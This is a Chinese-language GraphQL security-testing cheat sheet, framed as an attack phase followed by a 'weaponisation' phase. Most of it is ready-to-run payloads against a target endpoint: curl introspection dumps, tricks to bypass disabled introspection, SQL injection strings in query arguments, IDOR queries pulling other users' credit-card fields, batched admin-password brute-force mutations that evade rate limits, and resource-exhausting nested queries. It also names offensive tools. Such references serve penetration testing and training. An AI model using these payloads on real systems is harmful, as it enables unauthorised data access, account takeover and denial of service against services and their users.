# GraphQL 安全测试实战参考

> 阶段分离: [攻击] 内省查询+信息收集 → [利用] 注入/越权/DoS/批量查询

> **last_updated**: 2026-06-04 | **tested_against**: Apollo Server, Hasura, GraphQL-JS
---

# 攻击阶段 — 检测与信息收集

## 1. 识别 GraphQL 端点

```bash
# 常见路径:
/graphql
/graphiql
/api/graphql
/query
/v1/graphql
/gql

# 检测:
# POST到 /graphql 返回 non-null 的JSON → 可能GraphQL
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{ __typename }"}'
# → {"data":{"__typename":"Query"}} → GraphQL确认!
```

### 1.1 查看 GraphiQL (交互式调试界面)

```bash
# 直接在浏览器打开:
https://target.com/graphiql
https://target.com/graphql
# 如果能打开 → 交互式API浏览器 → 直接看文档
```

## 2. 内省查询 (Introspection)

```bash
# === 获取全部 Schema ===
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name kind } } } } }"}'

# === 获取 Query 类型 ===
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name fields { name args { name type { name kind } } } } } }"}'

# === 获取 Mutation 类型 ===
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { name fields { name args { name type { name kind } } } } } }"}'
```

### 2.1 绕过内省禁用

```bash
# 有些GraphQL禁用了内省 → 尝试:
# 1. 加空格/换行
# 2. GET 请求 (POST可能被WAF拦截内省)
# 3. 分段查询:
{"query":"{ __schema { types { name } } }"}                  # 只要类型名
{"query":"{ __type(name:\"User\") { fields { name } } }"}   # 再查具体类型

# 4. 使用别名:
{"query":"{ a:__schema { types { name } } }"}
```

---

# 利用阶段 — 武器化

## 3. SQL 注入 via GraphQL

```graphql
# 查询:
query {
  user(id: "1' OR 1=1--") {
    username
    email
  }
}

# 或通过变量:
{"query":"query($id:String!){user(id:$id){id,name}}","variables":{"id":"1' OR 1=1--"}}
```

## 4. IDOR / 越权

```graphql
# 与REST IDOR相同原理, 只是查询形式变化:
query {
  user(id: 1) { name email creditCard }    # 自己的
  user(id: 2) { name email creditCard }    # 别人的! 如果有越权
}
```

## 5. 批量查询 (Batching Attacks)

```graphql
# === 批量密码爆破 (绕过速率限制) ===
[
  {"query":"mutation{login(username:\"admin\",password:\"pass1\"){token}}"},
  {"query":"mutation{login(username:\"admin\",password:\"pass2\"){token}}"},
  {"query":"mutation{login(username:\"admin\",password:\"pass3\"){token}}"},
  ...
  # 10个请求在一个POST中 → 绕过"每分钟5次"限制
]
```

## 6. DoS via 递归查询 (深度递归)

```graphql
# 构造深度嵌套查询:
query {
  user(id:1) {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                posts { id }
              }
            }
          }
        }
      }
    }
  }
}
# → 服务器资源耗尽

# 或循环查询:
query {
  a1: user(id:1) { ...Fragment }
  a2: user(id:2) { ...Fragment }
  ...
  a1000: user(id:1000) { ...Fragment }
}
fragment Fragment on User { id name email posts { id title } }
```

## 7. 常见工具

```bash
# graphw00f (指纹识别)
python3 graphw00f.py -t https://target.com/graphql

# InQL (Burp插件 → GraphQL内省+扫描)

# Clairvoyance (Python → 无内省时猜测schema)
python3 clairvoyance.py https://target.com/graphql -o schema.json

# CrackQL (自动密码爆破)
```

---

*参考: OWASP GraphQL + PortSwigger GraphQL + 实战案例*
